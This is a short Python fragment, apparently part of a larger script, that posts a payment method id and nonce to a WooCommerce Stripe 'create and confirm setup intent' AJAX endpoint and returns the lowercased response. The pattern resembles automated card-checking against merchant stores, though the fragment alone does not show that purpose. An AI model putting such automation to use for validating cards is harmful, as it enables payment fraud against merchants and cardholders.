        d = {
            'action': "wc_stripe_create_and_confirm_setup_intent",
            'wc-stripe-payment-method': pm, '_ajax_nonce': nonce
        }
        r = self.s.post(ConnectionEncryptor.get_url("stripe_ajax"), headers=h, data=d)
        return r.text.lower()

